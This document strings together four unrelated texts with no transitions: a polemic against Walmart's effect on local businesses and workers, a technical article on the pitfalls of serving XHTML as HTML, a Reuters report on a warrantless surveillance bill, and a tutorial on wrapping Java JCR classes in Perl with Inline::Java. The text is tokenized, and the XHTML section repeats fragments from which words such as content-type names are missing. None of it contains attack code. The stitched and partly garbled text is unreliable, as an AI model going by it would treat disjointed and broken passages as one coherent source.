Allow WalMart ( and other super - discount stores ) to devastate local , small businesses because , Such large retailers bring economies of scale , lower prices and create more new jobs than the jobs lost in the once locally owned retail sector .
Allow these WalMart - types to import unlimited goods from cheap labor countries like China , even though doing so destroys high - paying US manufacturing jobs , because ...
US workers must adjust to compete in the new global economy and , even though their once high - paying manufacturing jobs will be replaced with lower - paying service sector jobs - like those $ 10 / hr .
Jobs at WalMart -- they wo n't feel the pain because ...
US workers will be able to buy the imported stuff for so much less at WalMart .
See .
A win-win . Right ?
No .
It was never right and and now we can prove it .
WalMart cut the golden goose open figuring it could grab all the gold for itself .
Now all they - and we -- have to show for it is goose on life support .
For a while anyway , many displaced American workers bought into WalMart 's fairytale economic analysis .
In the beginning they flocked to their local WalMarts to scarf up VCRs and TV's and chic furniture , clothing and shoes - all at prices a fraction of what their local mercantile once charged .
Then they shopped WalMart because their local mercantile had been driven out of business .
But never mind .
Even though they were now earning half what they used to , easy credit and home refi's were keeping them in the black , and those WalMart prices were so low !
How could they resist ?
Then music slowed .
Credit got tighter .
Suddenly working folk had to start living within their new low - wage reality .
From that point on they shopped at WalMart because they could n't afford to shop anywhere else .
Which was likely WalMart 's plan all along .
High fives all around WalMart headquarters .
For a brief moment in time WalMart had created a retailer 's paradise -- albeit a fool 's paradise .
Low wage - slave workers , 127 million of them every week , marching slack - jawed across giant parkinglots into WalMarts from coast to coast .
Each little peasant family clutching that week 's meager earnings with which they purchased all their basic needs -- made by even lower - paid Chinese peasants -- from WalMart .
( No extra charge for lead content . )
Now we see the beginning of the end of that too .
The once vibrant American working class - the goose that laid generations of golden eggs for America and Americans - is now under hospice care - one foot in the grave and the other on a banana peel .
And , in what will go down in economic history as a classic comeuppance , WalMart is itself about to get the same marco - economic reality check it handed out to local competitors and American workers .
And what about all those American workers WalMart screwed blue and tattooed too ?
What are they feeling now ?
Not good .
And they have their own way of saying , " up yours " to the folks who helped engineer this meltdown .
" In addition , Schoewe said Wal - Mart was contending with higher levels of " shrink " - inventory that is lost employee theft ( and ) shoplifting ...
" If you think about the macro environment , where customers are under pressure , there 's generally a correlation between theft and macro economic pressure , " Schoewe said .
" Unfortunately , that 's what we 're seeing . "
Duh .

Beware of XHTML
If you 're a web developer , you 've probably worked a lot with XHTML , the markup language developed in 1999 to implement HTML as an XML format .
Most people who use and promote XHTML do so because they think it's the “ next version ” of HTML , and they may have heard of some benefits here and there .
But there is a lot more to it than you may realize , and if you 're using it on your website , even if it validates , you are probably using it incorrectly .
I believe that XHTML has many good potential applications , and I hope it continues to thrive as a standard .
This is precisely why I have written this article .
The state of XHTML on the Web today is more broken than the state of HTML , and most people do n't realize because the major browsers are using classic HTML parsers that hide the problems .
Even among the few sites that know how to trigger the XML parser , the authors tend to overlook some important issues .
If you really hope for the XHTML standard to succeed , you should read this article carefully .
What is XHTML ?
Up XHTML is a markup language originally hoped to someday replace HTML on the Web .
For the most part , an XHTML 1.0 document differs from an HTML 4.01 document only in the lexical and syntactic rules : HTML is written in its own unique syntax defined by SGML , while XHTML is written in a different SGML - defined syntax called XML .
The syntaxes differ in some of the characters that delimit tags and other constructs , whether or not certain types of shorthand markup may be used , and whether or not tag names or character entities are case sensitive , among other small differences .
The Document Type Definition ( DTD , which is referenced by the doctype declaration ) then defines which elements , attributes , and character entities exist in the language and where those elements may be placed .
The DTDs of XHTML 1.0 and HTML 4.01 are nearly identical , meaning that as far as things like elements and attributes go , XHTML 1.0 and HTML 4.01 are basically the same language .
The only added benefit of XHTML is that it 's written in XML and shares the benefits XML has over HTML 's syntax .
I 'll explain those benefits later in this article , but first I 'd like to debunk some of the false benefits you may have heard .
Myths of XHTML Up
There are many false benefits of XHTML promoted on the Web .
Let 's clear up some of them at a glance ( with details and other pitfalls provided later ) : XHTML does not promote separation of content and presentation any more than HTML does .
XHTML has all of the same elements and attributes ( including presentational ones ) that HTML has , and it does n't offer any additional CSS features .
Semantic markup and separation of content and presentation is absolutely possible in HTML , and with equal ease .
In terms of semantics , HTML 4.01 and XHTML 1.0 are exactly the same .
Most XHTML pages on the Web are not parsed as XML by today 's web browsers .
With typical server configurations , browsers will parse your XHTML as HTML “ tag soup ” instead .
The vast majority of XHTML pages on the Web cannot be parsed as XML since they rely on HTML error handling .
Even most of the valid XHTML results in disfigured pages when parsed as XML , since they were only tested in HTML - parsing browsers .
XML parsers do not typically check documents for validity .
They only check them for well - formedness , which is a separate concept .
If you leave out a required element , use deprecated or nonstandard elements or attributes , or put an element somewhere it is n't allowed , the XML parser will provide no indication of the error , and the browser will have to silently deal with the error like HTML parsers do .
HTML is not deprecated and is not being phased out at this time .
In fact , the World Wide Web Consortium recently renewed the HTML working group , which is working to develop HTML 5 .
The developers of Firefox , Opera , and Safari have pushed very hard for the development of HTML 5 and have largely ignored the development of XHTML 2 .
The Safari development team has even opted to not take part in the XHTML 2 development process .
The CTO of Opera said in an interview , “ I do n't think XHTML is a realistic option for the masses .
HTML5 is it . ”
XHTML 1.x is not “ future - compatible ” .
XHTML 2 , currently in the drafting stages , is not backwards - compatible with XHTML 1.x.
XHTML 2 will have lots of major changes to the way documents are written and structured , and even if you already have your site written in XHTML 1.1 , a complete site rewrite will usually be necessary in order to convert it to proper XHTML 2 .
A simple XSL transformation will not be sufficient in most cases , because some semantics wo n't translate properly .
HTML 4.01 is actually more future - compatible .
A valid HTML 4.01 document written to modern support levels will be valid HTML 5 , and HTML 5 is where the majority of attention is from browser developers and the W3C .
XHTML does not have good browser support .
In typical setups , most browsers simply pretend that your XHTML pages are regular HTML ( which presents a number of problems , as I 'll explain later ) .
Some major browsers like Firefox , Opera , and Safari may attempt to handle the page as proper XHTML if and only if you include a special HTTP header instructing it to do so .
But when you do , Internet Explorer and a number of other user agents will choke on it and wo n't display a page at all .
Even when handled as XHTML , the supporting browsers have a number of additional bugs , which I 'll also discuss in this article .
Most browsers do not parse valid XHTML dramatically faster than valid HTML , even when they 're parsing XHTML correctly .
This is partly because most browsers only support a small subset of the HTML / SGML standard to begin with , so the real complexities of proper HTML parsing are mostly ignored anyway .
The only major additional complexity of HTML that is well supported is tag omission , but most browsers use hardcoded rules specific to HTML in order to cheat through that with minimal performance impact .
The browser can lose some minor shorthand logic with XML , but it now has to use extra logic to confirm that the document is well - formed .
Although XHTML , when parsed with an XML parser , may be slightly faster to parse than typical HTML , the difference is n't very significant in most cases .
And either way , download speed is usually the bottleneck when it comes to document parsing .
Whether it 's HTML or XHTML , by the time the page finishes downloading , the whole thing is already parsed .
The users wo n't notice any speed difference .
XHTML is not extensible if you hope to support Internet Explorer or the number of other user agents that can't parse XHTML as XML .
They will handle the document as HTML and you will have no extensibility benefit .
XHTML source is not necessarily any “ cleaner ” than HTML source .
If you prefer using lower - case tag and attribute names , you can do so in HTML .
If you prefer having quotes around all attribute values , you may do so in HTML .
If you prefer making sure all of your non-empty elements have end tags , you may use end tags in HTML , too .
In fact , these are considered best practice principles in HTML .
The only real markup differences between an HTML document following best practices and an XHTML document following the legacy compatibility guidelines are the doctype choice , XHTML 's extra required attributes on the html tag , and XHTML 's extra / character in empty element tags .
Some argue that the availability of HTML 's shorthand constructs is what makes HTML “ unclean ” .
But the only HTML shorthand construct that is required is the omitted end tag on elements that have to be empty , and it 's common practice in XHTML ( alas , even required in many cases ) to also use a shorthand construct on those elements : the so - called “ self - closing tag ” which originates from SGML's “ null end tag ” shorthand construct .
If you prefer to minimize your use of shorthand markup and would like the validator to enforce those restrictions in HTML as well , you can use Web Devout 's HTML Good Practice Checker .
Using XHTML does not encourage better support by web browsers and it is not “ a vote for a better Web ” if you are still supporting Internet Explorer and various search engines and other user agents that require text / html .
If you serve it with the typical text / html content type , you are giving all browsers a thumbs - up to treat it exactly like classic HTML , meaning absolutely no progress is made .
Even if you use only application / xhtml+xml and shut out Internet Explorer and various other user agents entirely , it wo n't mean anything : Microsoft already plans to support real XHTML in an upcoming release of Internet Explorer ; they just want to make sure they support it correctly from the initial launch .
Even still , XHTML 1.x is a dead - end standard , since it 's completely incompatible with XHTML 2.0 and all other future HTML / XHTML standards , as explained aboved , and since the majority of XHTML content on the Web today cannot be safely parsed as XML .
Benefits of XML Up XML does have a number of improvements over HTML 's syntax : Although HTML 's syntax allowed for a lot of shorthand markup and other flexibility , it proved too difficult to write a correct and fully - featured parser for it , since a truly correct parser would have to support the entire SGML standard .
As a result , most user agents , including all of today 's major web browsers , make many technically unsound assumptions about the lexical format of HTML documents and do n't support a number of shorthand features like Null End Tags ( < tag / Content / ) , unclosed start / end tags ( < tag < tag > ) , and empty tags ( <> ) .
XML was designed to eliminate these extra features and restrict documents to a tight set of rules that are more straight - forward for user agents to implement .
In effect , XML defines the assumptions that user agents are allowed to make , while still resulting in a file that a theoretical fully - featured SGML user agent could parse once pointed to XML's SGML declaration .
It should be noted that an XML parser for the most part is not dramatically easier to write than the level of HTML support offered by most HTML parsers ( which will be thoroughly specified in HTML 5 ) .
Most of the features that would make HTML more difficult to write a parser for , such as custom SGML declarations , additional marked sections , and most of the shorthand constructs , have negligible use on the Web anyway and generally have poor or absent support in major web browsers .
The most significant difference is XML 's lack of support for omitted start and end tags , which in theory could amount to complicated logic in HTML for elements not defined as empty .
Even still , most browsers do n't bother to implement real DTD - based parsing logic , so it is n't quite so complicated in practice .
In hopes of eliminating some error handling logic , XML user agents are told to not be flexible with errors : if a user agent comes upon a problem in the XML document , it will simply give up trying to read it .
Instead , the user will be presented with a “ parse error ” message instead of the webpage .
This eliminates the compatibility issues with incorrectly - written markup and browser - specific error handling methods by requiring documents to be “ well - formed ” , while giving webpage authors immediate indication of the problem .
This does , however , mean that a single minor issue like an unescaped ampersand ( & ) in a URL or a mismatched character encoding in a trackback message would cause the entire page to fail , and so most of today 's public web applications can't safely be incorporated in a true XHTML page .
While user agents are supposed to fail on any page that is n't well - formed ( in other words , one that does n't follow the generic XML grammar rules ) , they do not have to fail on a page that is well - formed but invalid .
For example , although it is invalid to have a span element as an immediate child of the body element , most XML - supporting web browsers wo n't provide indication of the error because the page is still well - formed — that is , the DTD is violated , but not the fundamental rules of XML itself .
Some user agents may choose to be “ validating ” agents and will also fail on validity errors , but they are n't common .
There is some worry that people may rely too heavily on the well - formedness checker and forget to also check for validity , which could lead to a higher occurrence of invalid pages even among the otherwise standards - conscious developers .
Despite popular assumption , even if an XML page is perfectly valid according to some validators , it still might not be well - formed .
Well - formedness involves some requirements not present in the classic SGML definition of validity .
Unlike HTML 's SGML - defined syntax , which was specifically made for HTML , XML is a common syntax used in many different languages .
This means that a single relatively simple set of parsing logic can handle a number of different languages .
It also paved the way for the Namespaces in XML standard , which allows multiple documents in different XML formats to be combined in a single XML document , so that you can have , for example , an XHTML page that contains one or more SVG images that use MathML inside them .
The practicality of this on webpages is a subject of debate .
Separation of content , presentation , and behavior is a defining characteristic of modern web development , as the modular setup provides many benefits over the mixed alternative .
Those benefits also hold true when debating the idea of mixed XML formats .
Since ( X) HTML provides facilities for embedding other XML formats in a more modular fashion ( using elements like object and link ) , it 's usually better to use the modular approach rather than mixing the files in a single document .
Moving the SVG or RSS data into files separate from the ( X ) HTML allows the user agent to cache them and improve performance while reducing bandwidth cost and easing maintainability .
Content type is everything Up
When your website sends a document to the visitor 's browser , it adds on a special content type header that lets the browser know what kind of document it 's dealing with .
For example , a PNG image has the content type image / png and a CSS file has the content type text / css .
HTML documents have the content type text / html .
Web servers typically send this content type whenever the file extension is .html , and server - side scripting languages like PHP also typically send documents as text / html by default .
XHTML does not have the same content type as HTML .
The proper content type for XHTML is application / xhtml+xml .
Currently , many web servers do n't have this content type reserved for any file extension , so you would need to modify the server configuration files or use a server - side scripting language to send the header manually .
Simply specifying the content type in a meta element will not work over HTTP .
When a web browser sees the text / html content type , regardless of what the doctype says , it automatically assumes that it 's dealing with plain old HTML .
Therefore , rather than using the XML parsing engine , it treats the document like tag soup , expecting HTML content .
Because HTML 4.01 and simple XHTML 1.0 are often very similar , the browser can still understand the page fairly well .
Most major browsers consider things like the self - closing portion of a tag ( as in < br /> ) as a simple HTML error and strip it out , usually ending up with the HTML equivalent of what the author intended .
However , when the document is treated like HTML , you get none of the benefits XHTML offers .
The browser wo n't understand other XML formats like MathML and SVG that are included in the document , and it wo n't do the automatic validation that XML parsers do .
In order for the document to be treated properly , the server would need to send the application / xhtml+xml content type .
The problems go deeper .
Comment markers are sometimes handled differently depending on the content type , and when you enclose the contents of a script or style element with basic SGML - style comments , it will cause your script and style information to be completely ignored when the document is treated like XML .
Also , any special markup characters used in the inline contents of a style or script element will be parsed as markup instead of being treated as character data like in HTML .
To solve these problems , you must use an elaborate escape sequence described in the article Escaping Style and Script Data , and even then there are situations in which it wo n't work .
Furthermore , the CSS and DOM specifications have special provisions for HTML that do n't apply to XHTML when it 's treated as XML , so your page may look and behave in unexpected ways .
The most common problem is a white gap around your page if you have a background on the body , no background on the html element , and any kind of spacing between the elements , such as a margin , padding , or a body height under 100 % ( browsers typically have some combination of these by default ) .
In scripting , tag names are returned differently and document . write ( ) does n't work in XHTML treated as XML .
Table structure in the DOM is different between the two parsing modes .
These are only a select few of the many differences .
The following are some examples of differing behavior between XHTML treated as HTML and XHTML treated as XML .
The anticipated results are based on the way Internet Explorer , Firefox , and Opera treat XHTML served as HTML .
Some other browsers are known to behave differently .
Also note that Internet Explorer does n't recognize the application / xhtml+xml content type ( see below for an explanation ) , so it will not be able to view the examples in the second column .

HTML compatibility guidelines Up
When the XHTML 1.0 specification was first written , there were provisions that allowed an XHTML document to be sent as text / html as long as certain compatibility guidelines were followed .
The idea was to ease migration to the new format without breaking old user agents .
However , these provisions are now viewed by many as a mistake .
The whole point of XHTML is to be an XML alternative to HTML , yet due to the allowance of XHTML documents to be sent as text / html , most so - called XHTML documents on the Web today would break if they were treated like XML ( see the real - world examples below ) .
This even includes many valid XHTML documents .
Several prominent members of the W3C are now challenging the wisdom of the text / html provisions and advocating that this content type should never be allowed for XHTML .
Many authors incorrectly believe that following the HTML compatibility guidelines and validating the document will guarantee that the document is compatible with both the HTML and XHTML specifications .
In reality , if you use even a single self - closing tag in the document ( which includes any link , img , or br tag ) , you are already creating incompatibilities between the two specifications .
The reason for this particular issue is explained below .
In this article , I have already explained a number of other factors not covered in XHTML 1.0 Appendix C that will also cause the document to run into incompatibilities .
The truth is that the HTML compatibility guidelines do not actually provide true compatibility between HTML and XHTML ; they merely attempt to minimize the damage of using text / html for XHTML documents , and that damage control is very limited in effectiveness .
XHTML 1.x already makes no provision for the use of text / html when taking advantage of any XHTML features not present in HTML , and the current draft of XHTML 2 expressly forbids it .
Internet Explorer incompatibility Up Internet Explorer does not support XHTML .
Like other web browsers , when a document is sent as text / html , it treats the document as if it was a poorly constructed HTML document .
However , when the document is sent as application / xhtml+xml , Internet Explorer wo n't recognize it as a webpage ; instead , it will simply present the user with a download dialog .
This issue still exists in Internet Explorer 7 .
Although all other major web browsers , including Firefox , Opera , Safari , and Konqueror , support XHTML , the lack of support in Internet Explorer as well as major search engines and web applications makes use of it very discouraged .
Content negotiation Up Content negotiation is the idea of sending different content depending on what the user agent supports .
Many sites attempt to send XHTML as application / xhtml+xml to those who support it , and either XHTML as text / html or real HTML to those who do n't .
There are two methods generally used to determine what the user agent supports , using the Accept HTTP header : most often , sites use the incorrect method where they simply look for the string “ application / xhtml+xml ” in the header value ; although some sites will use the correct method , where they actually parse the header value , supporting wildcards and ordering by q value .
Unfortunately , neither of these methods works reliably .
The first method does n't work because not all XHTML - supporting user agents actually have the text “ application / xhtml+xml ” in the Accept header .
Safari and Konqueror are two such browsers .
The application / xhtml+xml content type is implied by a wildcard value instead .
Meanwhile , not all HTML - supporting user agents have “ text / html ” in the header .
Internet Explorer , for example , does n't mention this content type .
Like Safari and Konqueror , it implies this support by using a wildcard .
Even among those user agents that support XHTML and mention application / xhtml+xml in the header , it may have a lower q value than text / html ( or a matching wildcard ) , which implies that the user agent actually prefers text / html ( in other words , its XHTML support may be experimental or broken ) .
The second method ( the correct , 100 % standards - complaint one ) does n't work because most major browsers have inaccurate Accept headers : Firefox 2 and below have application / xhtml+xml listed with a higher q value than text / html , even though Mozilla has posted an official recommendation on its site saying that websites should use text / html for these versions if they can , for reasons described below .
listed with a higher value than , even though Mozilla has posted an official recommendation on its site saying that websites should use for these versions if they can , for reasons described below .
Internet Explorer does n't list either text / html or application / xhtml+xml in its Accept header .
Instead , both content types are covered by a single wildcard value ( which implies that every content type in existence is supported equally well , which is obviously untrue ) .
So Internet Explorer is saying that it supports both text / html and application / xhtml+xml equally , even though it actually does n't support application / xhtml+xml at all .
In the case that a user agent claims to support both equally , the site is supposed to use its own preference .
A possible workaround is for the site to “ prefer ” sending text / html or , in a toss - up situation , only send application / xhtml+xml if it 's actually mentioned explicitly in the header .
However ...
or in its header .
Instead , both content types are covered by a single wildcard value ( which implies that every content type in existence is supported equally well , which is obviously untrue ) .
So Internet Explorer is saying that it supports both and equally , even though it actually does n't support at all .
In the case that a user agent claims to support both equally , the site is supposed to use its own preference .
A possible workaround is for the site to “ prefer ” sending or , in a toss - up situation , only send if it 's actually mentioned explicitly in the header .
However ...
Safari and Konqueror , which support XHTML , also give text / html and application / xhtml+xml the same q value ( in fact , like Internet Explorer , they also claim to support everything in existence equally well ) .
But they do n't mention application / xhtml+xml explicitly — it 's implied by a wildcard .
So if you use the above workaround , Safari and Konqueror will receive text / html even though they really do support application / xhtml+xml .
As disappointing as it may be , content negotiation simply is n't a reliable approach to this problem .
Null End Tags ( NET ) Up
In XHTML , all elements are required to be closed , either by an end tag or by adding a slash to the start tag to make it self - closing .
Since giving empty elements like img or br an end tag would confuse browsers treating the page like HTML , self - closing tags tend to be promoted .
However , XML self - closing tags directly conflict with a little - known and poorly supported HTML / SGML feature : Null End Tags .
A Null End Tag is a special shorthand form of a tag that allows you to save a few characters in the document .
Instead of writing < title >
My page < / title > , you could simply write < title / My page / to accomplish the same thing .
Due to the rules of Null End Tags , a single slash in an empty element 's start tag would close the tag right then and there , meaning < br / is a complete and valid tag in HTML .
As a result , if you have < br / > or < br /> , a browser supporting Null End Tags would see that as a br element immediately followed by a simple > character .
Therefore , an XHTML page treated as HTML could be littered with unwanted > characters .
This problem is often overlooked because most popular browsers today are lacking support for Null End Tags , as well as some other SGML shorthand features .
However , there are still some smaller user agents that properly support Null End Tags .
One of the more well - known user agents that support it is the W3C validator .
If you send it a page that uses XHTML self - closing tags , but force it to parse the page as HTML / SGML like most user agents do for text / html pages , you can see the results in the outline : immediately after each of the self - closing elements , there is an unwanted > character that will be displayed on the page itself .
( It should be noted that the W3C Validator is unusual in that it generally determines the parsing mode from the doctype , rather than from the content type as most other user agents do .
Therefore , an HTML doctype was used in the above example just so the validator would attempt to parse the page using the HTML syntax as all major browsers will for text / html pages regardless of the doctype .
The Null End Tag rules are actually set in the SGML syntax definition , not the DTD , so this example is accurate to what you should expect in a fully compliant SGML user agent even with an XHTML doctype . )
Technically , a restricted and altered form of Null End Tags exists in XML and is frequently used : the self - closing portion of the start tag .
While Null End Tags are defined as / ... / in HTML 's syntax , they are specially defined as / ... > in XML with the added restriction that it must close immediately after it is opened , meaning the element must have no content .
This was designed to look similar to a regular start tag for web developers who are unfamiliar with typical Null End Tags .
However , in the process it creates inherent incompatibility with HTML 's syntax for all empty elements .
In summary , although this issue does n't show in most popular web browsers , a user agent that more fully supports SGML would see unwanted > characters all over XHTML pages that are sent with the text / html content type .
If the goal of using XHTML is to help promote standards , then it 's quite counterproductive to cause unnecessary problems for user agents that more correctly comply to the SGML standard .
Firefox and other problems Up Although Firefox supports the parsing of XHTML documents as XML when sent with the application / xhtml+xml content type , its performance in versions 2.0 and below is actually worse than with HTML .
When parsing a page as HTML , Firefox will begin displaying the page while the content is being downloaded .
This is called incremental rendering .
However , when it 's parsing XML content , Firefox 2.0 and below will wait until the entire page is downloaded and checked for well - formedness before any of the content is displayed .
This means that , although in theory XML is supposed to be faster to parse than HTML , in reality these versions of Firefox usually display HTML content to the user much faster than XHTML / XML content .
Thankfully , this issue is expected to be resolved in Firefox 3.0 .
However , there are also issues in other browsers , such as certain HTML - specific provisions in the CSS and DOM standards being mistakenly applied to XHTML content parsed as XML .
For example , if there is a background set on the body element and none on the html element , Opera will apply the background to the html element as it would in HTML .
So even when dealing exclusively with XHTML parsed as XML , you still run into a number of the same problems that you do when trying to serve XHTML either way .
All in all , true XHTML support in major user agents is still very weak .
Because a key user agent — namely , Internet Explorer — has made no visible effort to support XHTML , other major user agents have continued to see it as a relatively low priority and so these bugs have lingered .
HTML is recommended over XHTML by both Mozilla and Safari and is generally better supported than XHTML by all major browsers .
Conclusion Up XHTML is a very good thing , and I certainly hope to see it gain widespread acceptance in the future .
However , it simply is n't widely supported in its proper form .
XHTML is an XML format , and to force a web browser to treat it like HTML is going against the whole purpose of XHTML and also inevitably causes other complications .
Assuming you do n't want to dramatically limit access to your information , XHTML can only be used incorrectly , be interpretted as invalid markup by most user agents , cause unwanted results in others , and offer no added benefit over HTML .
HTML 4.01 Strict is still what most user agents and search engines are most accustomed to , and there 's absolutely nothing wrong with using it if you do n't need the added benefits of XML .
HTML 4.01 is still a W3C Recommendation , and the W3C has even announced plans to further develop HTML alongside XHTML in the future .
WASHINGTON ( Reuters ) --
The Democratic - led Congress yielded to President Bush on Saturday and approved legislation to temporarily expand government 's power to conduct electronic surveillance without a court order in tracking foreign suspects .
President Bush demanded Congress expand his surveillance authority before leaving for vacation .
Civil liberties groups charged the measure would create a broad net that would sweep up law - abiding U.S. citizens .
But the House of Representatives gave its concurrence to the bill , 227- 183 , a day after it won Senate approval , 60 - 28 .
The action came amid warnings of possible attacks on the United States .
" After months of prodding by House Republicans , Congress has finally closed the terrorist loophole in our surveillance law -- and America will be the safer for it , " declared House Minority Leader John Boehner , an Ohio Republican .
" We think it is not the bill that ought to pass , " said House Majority Leader Steny Hoyer .
But he conceded he and fellow Democrats were unable to stop the measure in this national security showdown with the White House .
" Protecting America is our most solemn obligation , " Bush said earlier in the day in urging Congress to send him the bill so he could sign it into law .

The measure would authorize the National Security Agency to intercept without a court order communications between people in the United States and foreign targets overseas .

Using Java Classes in Perl
I started a new job recently to refocus my career from systems administration to web development .
Part of that move meant using Java as my primary language at work and using a relatively new technology from the Java Community Process ( JCP ) , the Content Repository API for Java ( JCR ) , which is a hierarchical database standard for storing content .
However , not wanting to let the skills in my favorite language waste away , I ’ve been toying with similar technologies at home using Perl .
I decided to make a direct port of the JCR to Perl and did so by making Perl use an existing Java implementation via Inline : : Java .
While I ran into some snags along the way , I was happily surprised to find the process of using Java classes from Perl was fabulously easy .
Bringing the JCR to Perl
The key to using JCR from Perl is Inline : : Java .
This library allows a Perl program to call Java methods with very little effort .
For an introduction to Inline : : Java , I suggest starting where I did , Phil Crow ’s 2003 Bringing Java into Perl article on Perl.com about Inline : : Java .
I also relied heavily upon the documentation for Inline : : Java , which is very complete , if not exhaustive .
To get started on using the JCR , I used the reference implementation , Jackrabbit .
I downloaded the Jackrabbit JAR file , along with all the prerequisites , which I found on the Jackrabbit website under First Hops .
Then , I wrote a small script using Inline : : Java to load the Java classes from Jackrabbit , create a repository , and then quit .
I was able to take the First Hop with Jackrabbit in Perl as fast or faster than in Java :
#!/usr /bin/perl use strict ; use warnings ; use Inline Java => ' STUDY ' , STUDY => [ qw ( org.apache.jackrabbit.core.TransientRepository javax.jcr.Repository ) ] , AUTOSTUDY => 1 ; my $ repository = org :: apache::jackrabbit::core:: TransientRepository ->new ; my $ session = $ repository -> login ; eval { my $user = $ session ->getUserID ; my $ name = $ repository ->getDescriptor ( $ javax : : jcr : : Repository : : REP_NAME_DESC ) ; print " Logged in as $user to a $ name repository .
" ; } ; if ( $@ ) { print STDERR " Exception : " , $ @-> getMessage , " n " ; } $ session -> logout ;
This code is a direct Perl port of the first tutorial on the Jackrabbit website .
To run the code , you must make sure your class path is correct .
Because I initially dropped the JCR files into my working directory , I just ran these commands to get it to work :
% export CLASSPATH=$CLASSPATH:`echo
*. jar | tr ' ' ' :'` % perl firsthop .
pl
Within five minutes , I had a Perl script that could access the Jackrabbit libraries , create a repository , and login as anonymous .
This answered my first question : Can I port the JCR to Perl ?
Yes .
First Snags
After proceeding to the “ Second Hop ” in the Jackrabbit tutorial , I ran into my first snag .
To create nodes and properties with Jackrabbit , you must log in using a username and password .
However , the JCR uses an array of characters for the password argument .
Because Inline :: Java helpfully translates Java string objects into Perl scalars , I could not determine a way to do so .
I also realized that I did not want to use lengthy Java namespaces in my Perl code .
Writing out org :: apache::jackrabbit::core:: TransientRepository or javax : : jcr:: Repository is not a very productive use of my time and makes for odd - looking Perl code .
In addition , I did n’t want a library that depended on Jackrabbit .
There are several other JCR implementations either already written or on the way .
Day has CRX , there ’s another Open Source implementation named Jaceira in the works , and eXo has also created a JCR implementation , to name a few .
Given these difficulties and the potential for other problems that I knew would come up , it was time to build this project as a Perl module .
Creating the Wrappers
To create the abstraction I desired , it quickly became apparent that I needed a way to build wrappers around the stubs generated by Inline : : Java .
Therefore , I set about writing a script that could generate a Perl package for each library in the JCR .
Each wrapper package would , in addition to helping wrap special cases , clean up the Java namespace using naming conventions that are more common to Perl code ( particularly my Perl code , which is similar to Conway ’s conventions from Perl Best Practices ) .
Using Java Reflection
I first needed to discover the classes , methods , and fields to wrap .
There are more than 50 classes , interfaces , and exceptions in the JCR specification –I ’m too lazy to type all that .
Furthermore , the JCR is currently under revision via JSR 283 , I do n’t want to update the class list again later .
Finally , I want my wrappers to handle each method specifically because the use of AUTOLOAD ( ) is evil ( sometimes useful , but still evil ) .
I wrote a Java program to find all the classes in the JCR JAR file and write those class names out with additional information about methods , constructors , and fields .
I used a YAML - formatted file to store the information .
I made heavy use of the Java Reflection API to make this happen .
You can see the full source of JCR package generator ( inc/JCRPackageGenerator.java ) in the Java: : JCR distribution .
Here ’s one entry in the YAML JCR package output file ( inc/ packages.yml ) :
javax.jcr.SimpleCredentials : isa : - java.lang .
Object - javax.jcr.Credentials has_constructors : 1 methods : instance : getAttributeNames : Array : java.lang .
String getUserID : java.lang .
String toString : java.lang .
String getPassword : Array : char getAttribute : java.lang .
Object setAttribute : void removeAttribute : void
The information I chose to place in the YAML file is mostly the outcome of experimentation with the Perl generator script .
Because I wrote a generic handler to perform the required unwrapping that can handle any set of arguments , I did n’t bother to remember them here .
On the other hand , knowing the return type , recorded after each method name , is helpful to my implementation .
Code Generation with Perl
Next , I wrote a Perl script to load the information in the YAML file and generate the packages .
You can see the full source for inc / package - generator.pl as well .
This script is pretty ugly .
I do all the work of generating the information in Perl with embedded here - documents .
A much better way to do this would be to use a templating tool like Andy Wardley ’s Template Toolkit , which is what I ’d ultimately like to do .
Basically , this program iterates over all the entries loaded from the YAML file and generates a package for each class .
It creates a Perl package name from the Java package name and a Perl package file at the appropriate location in the distribution .
For example , javax.jcr.nodetype.ItemDefinition gets a Perl package name of Java:: JCR :: Nodetype:: ItemDefinition and a file location of lib / Java / JCR / Nodetype/ItemDefinition.pm .
The code injects a stock header and footer into the package file .
All the real magic happens in between these .
Handling Static Fields
The code adds static fields by modifying the symbol table so that the wrappers point to the automatically generated stubs .
For example , Java:: JCR :: PropertyType gets several entries like :
* STRING = * Java : :JCR :: javax ::jcr::PropertyType::STRING ; *BINARY = * Java::JCR :: javax ::jcr::PropertyType::BINARY ; *LONG = * Java::JCR :: javax ::jcr::PropertyType::LONG ;
For those who may not know , the first line makes the name Java : : JCR :: PropertyType::STRING
exactly identical to using the longer name , Java: : JCR : : javax :: jcr::Property::STRING by modifying the symbol table directly .
OK , looking at that , you probably want to know why all the Inline : : Java stubs now have Java: : JCR on the front of them .
The reason is that in the generated code , I use the study_classes ( ) routine to import the Java code and specify that the base package for the import should be Java : : JCR :
study_classes ([' javax.jcr.PropertyType ' ] , ' Java :: JCR ' ) ;
Why ?
It ’s really not that critical , but I figured that because the name of the package I was putting on CPAN was Java : : JCR , I really did n’t want to drop packages into an external namespace while I was at it .
Because the wrappers hide all the long names , the actual length of the internal names does n’t matter anyway .
Dealing with Constructors and Methods
After fields , the code checks whether the Java class provides a constructor ( that is , if it ’s a class rather than an interface ) .
As it turns out , I never actually use the code for dealing with constructors for two reasons :
Exceptions .
For reasons I ’ll explain later , I do n’t generate the exception classes .
Therefore , these constructors go unused .
SimpleCredentials .
The only remaining class that has a constructor is java.jcr .
SimpleCredentials , which is the special case I ’ve already mentioned .
Therefore , I only need to cope with constructors as a special case .
I ’ll cover the special cases later as well .
After the constructor , the program runs through each method and generates both the static and instance method wrappers .
Here ’s a typical method wrapper from Java: : JCR :: Repository :
sub login { my $ self = shift ; my @args = Java:: JCR ::Base::_process_args(@_ ) ; my $ result = eval { $ self ->{obj} -> login( @args ) } ; if ( $@ ) { my $e = Java : : JCR : : Exception -> new ( $@ ) ; croak $e } return Java : : JCR :: Base::_process_return($result , " javax.jcr.Session " , " Java : : JCR : : Session " ) ; }
Camel Case
This particular example does n’t show it , but I also changed the camel - case Java names of every method to all lowercase with underscores , which is a much more common way of naming methods in Perl .
I may add aliases using the Java names in the future , but I do n’t care for Java - style naming conventions in Perl code .
The most interesting part of this process was handing names that include all - caps abbreviations .
That required two lines of Perl :
my $ perl_method_name = $ method_name ; $ perl_method_name =~ s/( p{IsLu} + ) / _L$1E/g ;
The /( \p{IsLu} + ) / matches any uppercase letter or string of uppercase letters .
The replacement applies the \L modifier to the regular expression to convert the matched snippet to all lowercase .
I prepend an underscore to complete the conversion .
Thus , the method named getDescriptor becomes get_descriptor and the method named getNodeByUUID becomes get_node_by_uuid .
This wo n’t work very well , by the way , if there are any names that have abbreviations before the end ( for example , if there had been a getUUIDNode , which would become get_uuidnode )
Fortunately , this case never shows up in the JCR API .
Method Wrappers
Java:: JCR :: Base ::_process_arg( ) processes the arguments passed to each method .
